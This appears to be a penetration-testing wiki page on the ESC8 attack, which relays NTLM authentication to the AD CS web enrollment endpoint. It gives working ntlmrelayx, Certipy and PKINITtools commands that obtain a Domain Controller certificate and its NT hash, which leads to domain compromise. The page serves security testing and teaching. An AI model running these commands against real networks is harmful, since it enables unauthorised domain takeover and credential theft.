**NTLM relay to ADCS (ESC8)** — if a web server accepts NTLM authentication, you can usually relay it, unless Extended Protection for Authentication (EPA) is enforced. A prime target is the enrollment web service of Active Directory Certificate Services. Relaying a Domain Controller's authentication here yields a certificate for the DC and, from there, full domain compromise.

**Note:** EPA relies on Channel Binding through TLS, so **cleartext HTTP endpoints are always vulnerable**.

## Discovery

### With a domain user account

See [ADCS Configuration Issues](../../ADCS%20Attacks/ADCS%20Configuration%20Issues%20%28ESC1-8%29.md) to enumerate the ADCS configuration.

### Without a domain user account

- Enumerate HTTPS endpoints and inspect their certificates: if a certificate was issued by an internal CA (not self-signed), the CA server's name and/or FQDN is usually present in it.
- Enumerate the ADCS configuration through an NTLM relay to LDAP - see Attack 5 in [NTLM Relay to LDAP](NTLM%20Relay%20to%20LDAP.md).

### Web enrollment endpoint

To check whether web enrollment is active, try `https://CA_FQDN/certsrv/certfnsh.asp`.

- Try both `http://` and `https://`.
- If 80/443 are closed, try another port (check your scan results).
- The URI to look for is `/certsrv/certfnsh.asp` regardless of host.

**Warning:** Web enrollment is not configured in a default AD CS install, so this service may not exist.

## Exploitation

Scenario: capture a **Domain Controller's** authentication over SMB (it could be any domain user or computer account).

Prepare the relay:

```bash

ntlmrelayx.py -t 'https://CA_FQDN/certsrv/certfnsh.asp' -smb2support --adcs --template "KerberosAuthentication"
# OR - Certipy handles the scheme and path automatically
certipy relay -target "CA_FQDN" -template "DomainController"

```

Passively capture or [coerce](../../Coercion/Coercing%20Authentication.md) an NTLM authentication - ideally from a Domain Controller.

Use PKINIT to recover the account's NT hash from the issued certificate:

```bash

# With Certipy
certipy auth -pfx './DC$.pfx'

# OR, with PKINITtools
gettgtpkinit.py -cert-pfx './DC$.pfx' 'DOMAIN/DC$' 'DC_TGT.ccache'
KRB5CCNAME=DC_TGT.ccache getnthash.py 'DOMAIN/DC$' -key 'ENCRYPTION_KEY_HERE'

```

**Note:** `ENCRYPTION_KEY_HERE` is the AS-REP encryption key printed by `gettgtpkinit.py`.

For the IPv6/mitm6 + Kerberos-relay variant of this attack, see [Kerberos to ESC-8 relay](../mitm6%20relay/Kerberos%20to%20ESC-8%20relay.md).

## References

- Certipy - https://github.com/ly4k/Certipy
- ntlmrelayx.py - https://github.com/fortra/impacket
- PKINITtools - https://github.com/dirkjanm/PKINITtools
- SpecterOps - Certified Pre-Owned - https://posts.specterops.io/certified-pre-owned-d95910965cd2
